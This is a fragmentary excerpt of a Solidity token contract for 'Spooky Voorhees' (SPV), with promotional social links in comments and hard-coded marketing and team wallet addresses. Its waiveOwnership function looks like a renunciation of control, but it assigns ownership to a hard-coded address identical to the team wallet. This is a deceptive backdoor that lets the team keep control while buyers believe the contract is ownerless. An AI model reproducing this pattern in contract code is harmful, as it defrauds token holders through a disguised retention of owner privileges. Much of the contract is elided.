...
//https://twitter.com/spookyvoorhees
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
//https://t.me/Spookyvoorhees
interface IERC20 {
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x9Db9F07DB34695BF7B35221d589dFb14fC5dB080);
    }
...
contract SpookyVoorhees is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Spooky Voorhees";
    string private _symbol = "SPV";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x527014ce6767058820018eC82d27c4dB239be32A);
    address payable private teamWalletAddress = payable(0x9Db9F07DB34695BF7B35221d589dFb14fC5dB080);
